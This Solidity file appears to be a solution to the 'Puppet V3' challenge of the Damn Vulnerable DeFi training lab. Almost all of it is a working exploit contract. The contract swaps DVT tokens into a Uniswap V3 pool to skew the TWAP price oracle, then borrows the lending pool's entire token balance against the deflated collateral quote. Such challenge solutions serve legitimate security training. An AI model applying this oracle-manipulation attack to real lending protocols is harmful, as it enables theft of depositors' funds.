// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {OracleLibrary} from "@uniswap/v3-periphery/contracts/libraries/OracleLibrary.sol";
import {IUniswapV3Pool} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import {INonfungiblePositionManager} from "../../src/puppet-v3/INonfungiblePositionManager.sol";
import {IUniswapV3SwapCallback} from "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {TickMath} from "@uniswap/v3-core/contracts/libraries/TickMath.sol";
import {PuppetV3Pool} from "../../src/puppet-v3/PuppetV3Pool.sol";

contract PuppetV3Exploiter {
    uint256 constant LENDING_POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;
    uint256 constant DEPOSIT_FACTOR = 3;
    uint32 constant TWAP_PERIOD = 10 minutes;

    IUniswapV3Pool private _uniswapv3pool;
    PuppetV3Pool private _pool;

    address private _dvt;
    address payable private _weth;
    address private _recovery;

    constructor(IUniswapV3Pool uniswapv3pool, PuppetV3Pool pool, address dvt, address payable weth, address recovery) payable {
        _uniswapv3pool = uniswapv3pool;
        _pool = pool;
        _dvt = dvt;
        _weth = weth;
        _recovery = recovery;
    }   

    function exploit() public {
        IERC20(_dvt).approve(address(_uniswapv3pool), type(uint256).max);
        WETH(_weth).deposit{value: 1 ether}();

        // swap direction: DVT (token0) -> WETH (token1)
        int256 amountIn = int256(IERC20(_dvt).balanceOf(address(this)));
        _uniswapv3pool.swap(
            address(this),     // recipient
            true,              // zeroForOne: token0 -> token1
            amountIn,  // amountSpecified: positive (exactInput if input amount is known)
            TickMath.MIN_SQRT_RATIO + 1, // sqrtPriceLimitX96: no restriction
            abi.encode(amountIn)  // data
        );
    }

    function post_exploit() external {
        uint256 borrow_amount = IERC20(_dvt).balanceOf(address(_pool));
        (int24 arithmeticMeanTick,) = OracleLibrary.consult({pool: address(_uniswapv3pool), secondsAgo: TWAP_PERIOD});
        uint256 quote = OracleLibrary.getQuoteAtTick({
            tick: arithmeticMeanTick,
            baseAmount: uint128(LENDING_POOL_INITIAL_TOKEN_BALANCE),
            baseToken: address(_dvt),
            quoteToken: address(_weth)
        });

        console.log("arithmeticMeanTick:", arithmeticMeanTick);
        console.log("quote:", quote);

        IERC20(_weth).approve(address(_pool), quote * DEPOSIT_FACTOR + 1);
        _pool.borrow(borrow_amount);
        IERC20(_dvt).transfer(_recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
    }

    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata
    ) external {
        require(msg.sender == address(_uniswapv3pool), "Not pool");
        console.log("amount0Delta:", amount0Delta);
        console.log("amount1Delta:", amount1Delta);
        if (amount0Delta > 0) {
            // We are paying token0 (DVT)
            IERC20(_dvt).transfer(msg.sender, uint256(amount0Delta));
        }
        // No need to do anything with amount1Delta (WETH), that's what we receive.
    }
}